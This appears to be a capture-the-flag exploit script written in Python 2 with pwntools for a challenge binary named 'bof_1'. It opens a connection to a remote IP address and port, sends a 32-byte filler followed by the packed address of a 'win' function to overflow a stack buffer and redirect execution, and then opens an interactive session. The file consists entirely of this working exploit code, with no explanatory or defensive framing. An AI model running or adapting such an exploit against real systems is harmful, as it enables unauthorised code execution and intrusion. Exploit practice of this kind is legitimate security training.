#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "140.136.150.68"
port = "8888"

if _local:
	r = process('./bof_1')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

win = 0x080484eb
payload='A'*32
payload += p32(win)


print r.recvuntil('?')
r.sendline(payload)

r.interactive()